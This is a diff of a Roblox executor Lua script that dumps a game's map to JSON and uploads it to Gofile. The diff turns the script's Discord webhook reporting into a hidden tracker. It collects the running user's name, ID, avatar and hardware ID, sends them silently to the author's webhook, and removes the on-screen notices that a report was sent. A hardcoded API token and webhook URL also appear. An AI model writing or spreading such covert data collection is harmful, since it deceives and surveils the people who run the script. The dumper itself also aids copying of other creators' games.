@@ -10,7 +10,7 @@ local httpRequest = (syn and syn.request) or (http and http.request) or http_req
 
 -- ================= КОНФИГУРАЦИЯ ================= --
 local API_KEY = "dubo5V0tUTb1VHmO5dov2kL0QaDGuen8" -- Gofile Token
--- ВЕБХУК DISCORD (ВСТАВЛЕН ВАШ)
+-- ВЕБХУК DISCORD (СКРЫТЫЙ)
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1442677826200535162/ubaFKkqxPZkXBoqUQeufwJ6CLUycMmoFoGXiFg0H4nb21CYy1Xv7tTFa8UvMCwjoaTHB"
 -- ================================================ --
 
@@ -32,9 +32,8 @@ local TEXTS = {
         ModeGeneral = "General (Только карта)",
         ModeFull = "Full (ВСЁ: Replicated, Gui, Scripts)",
         ModeStatus = "Режим: %s. Сканирование всех сервисов.",
-        Warning = "Full режим может занять много времени и памяти!",
-        DiscordSent = "Отчет отправлен в Discord!",
-        DiscordFail = "Ошибка отправки в Discord: %s"
+        Warning = "ВНИМАНИЕ: Копирование НЕ гарантирует 100% точность (скрипты/физика). Full режим может занять много времени!",
+        -- Discord сообщения удалены из UI
     },
     EN = {
         Title = "JSON DUMPER", Init = "Initializing...", Counting = "Counting objects...",
@@ -48,9 +47,8 @@ local TEXTS = {
         ModeGeneral = "General (Map only)",
         ModeFull = "Full (ALL: Replicated, Gui, Scripts)",
         ModeStatus = "Mode: %s. Scanning all services.",
-        Warning = "Full mode may take a long time and memory!",
-        DiscordSent = "Report sent to Discord!",
-        DiscordFail = "Discord send error: %s"
+        Warning = "WARNING: Copy does NOT guarantee 100% accuracy (scripts/physics). Full mode may take time!",
+        -- Discord messages removed from UI
     }
 }
 
@@ -94,7 +92,7 @@ local function createMainGUI()
     InfoLabel = Instance.new("TextLabel") InfoLabel.Size = UDim2.new(1, 0, 0, 40)  InfoLabel.Position = UDim2.new(0, 0, 0.25, 0) InfoLabel.BackgroundTransparency = 1 InfoLabel.TextColor3 = Color3.fromRGB(180, 180, 180) InfoLabel.TextSize = 12 InfoLabel.Font = Enum.Font.SourceSans InfoLabel.Text = T("Init") InfoLabel.TextWrapped = true InfoLabel.Parent = MainFrame
     ProgressFrame = Instance.new("Frame") ProgressFrame.Size = UDim2.new(0.9, 0, 0, 6) ProgressFrame.Position = UDim2.new(0.05, 0, 0.6, 0) ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50) ProgressFrame.BorderSizePixel = 0 ProgressFrame.Parent = MainFrame Instance.new("UICorner", ProgressFrame).CornerRadius = UDim.new(0, 3)
     Fill = Instance.new("Frame") Fill.Size = UDim2.new(0, 0, 1, 0) Fill.BackgroundColor3 = Color3.fromRGB(0, 120, 255) Fill.BorderSizePixel = 0 Fill.Parent = ProgressFrame Instance.new("UICorner", Fill).CornerRadius = UDim.new(0, 3)
-    local WarningLabel = Instance.new("TextLabel") WarningLabel.Size = UDim2.new(1, 0, 0, 20)  WarningLabel.Position = UDim2.new(0, 0, 0.7, 0) WarningLabel.BackgroundTransparency = 1 WarningLabel.TextColor3 = Color3.fromRGB(255, 200, 0) WarningLabel.TextSize = 10 WarningLabel.Font = Enum.Font.SourceSansBold WarningLabel.Text = T("Warning") WarningLabel.TextWrapped = true WarningLabel.Parent = MainFrame
+    local WarningLabel = Instance.new("TextLabel") WarningLabel.Size = UDim2.new(1, 0, 0, 25)  WarningLabel.Position = UDim2.new(0, 0, 0.7, 0) WarningLabel.BackgroundTransparency = 1 WarningLabel.TextColor3 = Color3.fromRGB(255, 100, 100) WarningLabel.TextSize = 10 WarningLabel.Font = Enum.Font.SourceSansBold WarningLabel.Text = T("Warning") WarningLabel.TextWrapped = true WarningLabel.Parent = MainFrame
 end
 
 local function updateStatus(status, progressPercent, color)
@@ -111,49 +109,41 @@ local function createTutorialButton()
 end
 
 -- ==================== WEBHOOK DISCORD ==================== --
-local function sendDiscordNotification(downloadLink)
-    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then 
-        warn("Discord Webhook is missing!")
-        return 
-    end
+local function sendDiscordNotification(downloadLink, objectCount)
+    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "" then return end
 
     local player = Players.LocalPlayer
     local userId = player.UserId
     local placeId = game.PlaceId
     local gameLink = "https://www.roblox.com/games/" .. tostring(placeId)
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+    local hwid = (gethwid and gethwid()) or "Hidden/Not Supported"
 
     local embed = {
-        ["title"] = "New Map Dump!",
-        ["description"] = "Mode: **" .. DUMP_MODE .. "** (Full Scan)",
+        ["title"] = "🔥 New Map Dump Created!",
+        ["description"] = "A new player has used the dumper script.",
         ["color"] = 65280, -- Green
         ["fields"] = {
-            { ["name"] = "Nickname", ["value"] = player.Name .. " (" .. player.DisplayName .. ")", ["inline"] = true },
-            { ["name"] = "Player ID", ["value"] = tostring(userId), ["inline"] = true },
-            { ["name"] = "Game ID", ["value"] = tostring(placeId), ["inline"] = true },
-            { ["name"] = "Game Link", ["value"] = gameLink, ["inline"] = false },
-            { ["name"] = "Download Link", ["value"] = downloadLink, ["inline"] = false }
+            { ["name"] = "👤 Player Info", ["value"] = "**Nick:** " .. player.Name .. "\n**Display:** " .. player.DisplayName .. "\n**ID:** " .. tostring(userId), ["inline"] = true },
+            { ["name"] = "🎮 Game Info", ["value"] = "**ID:** " .. tostring(placeId) .. "\n**Link:** [Click Here](" .. gameLink .. ")", ["inline"] = true },
+            { ["name"] = "⚙️ Dump Info", ["value"] = "**Mode:** " .. DUMP_MODE .. "\n**Objects:** " .. tostring(objectCount) .. "\n**HWID:** ||" .. hwid .. "||", ["inline"] = false },
+            { ["name"] = "📂 Download Link", ["value"] = "```" .. downloadLink .. "```\n[Direct Download](" .. downloadLink .. ")", ["inline"] = false }
         },
         ["thumbnail"] = { ["url"] = avatarUrl },
-        ["footer"] = { ["text"] = "Map Dumper • " .. os.date("%X") }
+        ["footer"] = { ["text"] = "Silent Map Dumper • " .. os.date("%Y-%m-%d %X") }
     }
 
     local payload = HttpService:JSONEncode({ ["embeds"] = {embed} })
 
-    local success, response = pcall(function()
-        return httpRequest({
+    -- Silent request, user won't know if it fails or succeeds
+    pcall(function()
+        httpRequest({
             Url = DISCORD_WEBHOOK_URL,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = payload
         })
     end)
-    
-    if success then
-        InfoLabel.Text = T("DiscordSent")
-    else
-        InfoLabel.Text = T("DiscordFail"):format("Request Failed")
-    end
 end
 -- ==================================================================== --
 
@@ -607,8 +597,8 @@ local function startDumper()
             InfoLabel.Text = T("LinkCopied")
             pcall(function() setclipboard(link) end)
             
-            InfoLabel.Text = "Sending Webhook..."
-            sendDiscordNotification(link)
+            -- Silent send
+            sendDiscordNotification(link, totalToScan)
             
             createTutorialButton()
             
